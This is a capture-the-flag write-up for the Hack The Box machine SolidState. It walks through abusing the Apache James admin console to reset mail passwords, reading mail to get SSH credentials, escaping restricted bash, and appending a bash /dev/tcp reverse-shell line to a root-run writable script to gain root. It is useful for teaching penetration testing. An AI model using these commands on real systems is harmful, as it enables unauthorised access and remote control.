---
title: "SolidState - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## SolidState
![](https://kar0nx.github.io/assets/images/writeup/cfb87d43d2b47380fd0f3a3efb6a47ed.png)
## Reconnaissance

IP: 10.10.10.51
## NMAP

```
nmap -T4 -p- -A 10.10.10.51
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 08:33 UTC
Nmap scan report for 10.10.10.51
Host is up (0.031s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.8 [10.10.14.8])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   29.41 ms 10.10.14.1
2   30.06 ms 10.10.10.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.66 seconds
```

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830103732.png)

I can't spot anything usefull on site so I switched searching for mail service

## Apache James Server 2.3.2

JAMES smtpd 2.3.2. I found article:
https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830104529.png)

so lets try this

```
telnet 10.10.10.51 4555
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830104552.png)

I change all users passwords to root to faster enumeration:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830104841.png)

Now let's check their mailboxes via POP3 (port 110). While login with mindy credentials I found juicy email with username and password for ssh login

```
telnet 10.10.10.51 110
USER mindy
PASS root
LIST
RETR 1
RETR 2
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830105546.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830105524.png)

Now let's login via ssh with mindy: P@55W0rd1!2@
Restricted bash :/

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830105808.png)

### Escaping Restricted Bash (rBash)

Via ssh it is great to start with -t bash which execute bash on connect

```
ssh mindy@10.10.10.51 -t bash
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830111453.png)

## Privilege escalation

I run linpeas and found 2 good places to start localport on 631 and python script with 777 own by root

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830114706.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830114616.png)

First I added revshell to script

```
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.47/443 0>&1"')
```

And that was quick :) I got reverse shell as root

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830115121.png)

Now we can grab root.txt

If we want confirm that root run this process every few minutes we can run pspy

```
./pspy32
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830124711.png)